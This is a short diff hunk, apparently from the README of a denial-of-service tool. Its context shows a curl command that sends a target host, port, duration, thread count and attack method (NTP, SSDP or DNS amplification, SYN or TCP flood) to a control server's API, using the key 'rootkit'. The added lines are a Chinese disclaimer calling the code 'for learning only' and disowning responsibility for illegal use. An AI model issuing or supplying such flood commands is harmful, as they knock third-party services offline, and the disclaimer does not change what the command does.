@@ -20,3 +20,5 @@
 ```
 # curl -sd "key=rootkit&host=[IP]&port=[PORT]&time=[time/sec]&thread=[threads]&method=[ntp|ssdp|dns|syn|tcp]&stop=1" http://ServerIp:Port/api
 ```
+-- -
+本代码仅供学习交流使用， 如用将该代码于非法用途所导致的后果自负，与作者无关...
